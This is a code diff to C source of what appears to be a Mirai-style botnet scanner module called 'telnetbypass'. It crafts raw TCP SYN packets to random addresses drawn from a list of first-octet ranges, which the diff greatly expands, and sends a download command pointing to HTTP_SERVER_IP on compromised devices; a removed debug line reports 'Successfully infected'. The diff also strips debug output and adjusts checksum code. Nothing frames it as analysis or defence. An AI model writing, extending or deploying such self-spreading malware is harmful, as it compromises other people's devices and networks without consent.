@@ -2,9 +2,6 @@
 
 #define _GNU_SOURCE
 
-#ifdef DEBUG
-    #include <stdio.h>
-#endif
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -16,8 +13,9 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 
 #include "includes.h"
 #include "telnetbypass.h"
@@ -32,7 +30,7 @@ struct telnetbypass_scanner_auth *telnetbypass_auth_table = NULL;
 struct telnetbypass_scanner_connection *conn_table;
 uint16_t telnetbypass_telnetbypass_auth_table_max_weight = 0;
 uint32_t telnetbypass_fake_time = 0;
-int tlbypass_ranges[] = {189,187,201,190,200,153,180,191,210,177,179};
+int tlbypass_ranges[] = {189,187,201,190,200,153,180,191,210,177,179,45,103,116,118,72,73,46,47,48,49,50,51,52,58,59,60,61,104,105,106,107,108,109,110,111,112,113,114,115,117,119,120,121,122,123,124,125,175,176,178,181,182,183,184,185,186,188};
 
 int telnetbypass_recv_strip_null(int sock, void *buf, int len, int flags)
 {
@@ -81,18 +79,12 @@ void telnetbypass_scanner_init(void)
     // Set up raw socket scanning and payload
     if((telnetbypass_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
-        #ifdef DEBUG
-            printf("[telnetbypass] failed to initialize raw socket, cannot scan\n");
-        #endif
         exit(0);
     }
     fcntl(telnetbypass_rsck, F_SETFL, O_NONBLOCK | fcntl(telnetbypass_rsck, F_GETFL, 0));
     i = 1;
     if(setsockopt(telnetbypass_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
     {
-        #ifdef DEBUG
-            printf("[telnetbypass] failed to set IP_HDRINCL, cannot scan\n");
-        #endif
         close(telnetbypass_rsck);
         exit(0);
     }
@@ -122,13 +114,14 @@ void telnetbypass_scanner_init(void)
     tcph->doff = 5;
     tcph->syn = TRUE;
     tcph->window = rand_next() & 0xFFFF;
-    tcph->check = checksum((uint16_t *)telnetbypass_scanner_rawpkt, sizeof(telnetbypass_scanner_rawpkt));
+    tcph->check = checksum_generic((uint16_t *)telnetbypass_scanner_rawpkt, sizeof(telnetbypass_scanner_rawpkt) / 2);
 
     // Start scanner loop
     while(TRUE)
     {
         fd_set fdset;
         struct timeval timeo;
+        struct sockaddr_in paddr;
         int mfd = 0, nfds;
 
         FD_ZERO(&fdset);
@@ -151,9 +144,6 @@ void telnetbypass_scanner_init(void)
         nfds = select(mfd + 1, &fdset, NULL, NULL, &timeo);
         if(nfds == -1)
         {
-            #ifdef DEBUG
-                printf("[telnetbypass] select failed\n");
-            #endif
             break;
         }
         else if(nfds == 0)
@@ -168,11 +158,11 @@ void telnetbypass_scanner_init(void)
                 iph->id = rand_next();
                 iph->daddr = get_random_telnetbypass_ip();
                 iph->check = 0;
-                iph->check = checksum((uint16_t *)iph, sizeof(struct iphdr));
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
 
                 tcph->seq = rand_next();
                 tcph->check = 0;
-                tcph->check = checksum((uint16_t *)telnetbypass_scanner_rawpkt, sizeof(telnetbypass_scanner_rawpkt));
+                tcph->check = checksum_generic((uint16_t *)telnetbypass_scanner_rawpkt, sizeof(telnetbypass_scanner_rawpkt) / 2);
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
@@ -260,22 +250,9 @@ void telnetbypass_scanner_init(void)
                                 HTTP_SERVER_IP);
 
                             send(conn->fd, download_cmd, strlen(download_cmd), MSG_NOSIGNAL);
-                            
-                            // Report successful infection
-                            #ifdef DEBUG
-                                printf("[telnetbypass] Successfully infected %d.%d.%d.%d\n",
-                                    (conn->dst_addr >> 24) & 0xFF,
-                                    (conn->dst_addr >> 16) & 0xFF,
-                                    (conn->dst_addr >> 8) & 0xFF,
-                                    conn->dst_addr & 0xFF);
-                            #endif
-
                             conn->state = TELNETBYPASS_SC_CLOSED;
                         }
-                        else
-                        {
-                            conn->state = TELNETBYPASS_SC_CLOSED;
-                        }
+                        conn->state = TELNETBYPASS_SC_CLOSED;
                     }
                 }
 
@@ -332,8 +309,8 @@ static ipv4_t get_random_telnetbypass_ip(void)
 
     do
     {
-        range_idx = rand() % (sizeof(telnetbypass_ranges)/sizeof(int));
-        o1 = telnetbypass_ranges[range_idx];
+        range_idx = rand() % (sizeof(tlbypass_ranges)/sizeof(int));
+        o1 = tlbypass_ranges[range_idx];
 
         o2 = rand_next() % 256;
         o3 = rand_next() % 256;
